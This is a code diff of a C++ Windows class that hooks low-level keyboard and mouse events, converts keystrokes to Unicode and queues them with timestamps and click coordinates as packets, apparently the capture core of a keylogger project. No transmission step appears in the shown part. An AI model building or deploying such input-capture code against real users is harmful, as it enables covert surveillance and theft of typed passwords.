@@ -15,26 +15,65 @@ Packager::~Packager()
 
 void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
-	if ((info->vkCode == 160 || info->vkCode == 161) && nCode == 256) {
+	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == WM_SYSKEYDOWN) {
 		_shift = true;
 	}
-	if ((info->vkCode == 160 || info->vkCode == 161) && nCode == 257) {
+	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == WM_SYSKEYUP) {
 		_shift = false;
 	}
-	if ((info->vkCode == 162 || info->vkCode == 163) && nCode == 256) {
+	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == WM_SYSKEYDOWN) {
 		_ctrl = true;
 	}
-	if ((info->vkCode == 162 || info->vkCode == 163) && nCode == 257) {
+	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == WM_SYSKEYUP) {
 		_ctrl = false;
 	}
-	if ((info->vkCode == 91 || info->vkCode == 92) && nCode == 256) {
+	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == WM_SYSKEYDOWN) {
 		_win = true;
 	}
-	if ((info->vkCode == 91 || info->vkCode == 92) && nCode == 257) {
+	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == WM_SYSKEYUP) {
 		_win = false;
 	}
-	_pKeys.push_back(new PaquetKeys());
-	_pKeys.back()->setDate(info->time);
-	//_pKeys.back()->setText(info->vkCode);
-	_pKeys.back()->createPaquet();
+
+	BYTE kbdState[256];
+	GetKeyboardState(kbdState);
+	WCHAR buff[2];
+	if (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0) {
+		PaquetKeys *tmp = new PaquetKeys();
+		tmp->setDate(info->time);
+		std::cout << "UNICODE : " << buff[0] << std::endl;
+		//tmp->setText(buff);
+		tmp->createPaquet();
+		_paquets.push_back(tmp);
+	}
+}
+
+void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
+	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
+	PaquetMouse *tmp = new PaquetMouse();
+	tmp->setDate(info->time);
+	tmp->setX(info->pt.x);
+	tmp->setY(info->pt.y);
+	WORD highOrder = info->mouseData >> 16;
+	if (highOrder == XBUTTON1) {
+		tmp->setButton(1);
+	}
+	else if (highOrder == XBUTTON2) {
+		tmp->setButton(4);
+	}
+	else if (highOrder == WHEEL_DELTA) {
+		tmp->setButton(2);
+	}
+	tmp->createPaquet();
+	_paquets.push_back(tmp);
+}
+
+bool Packager::isEmpty() {
+	return _paquets.empty();
+}
+
+Paquet *Packager::getPaquet() {
+	return _paquets.front();
+}
+void Packager::supprPaquet() {
+	_paquets.erase(_paquets.begin());
 }
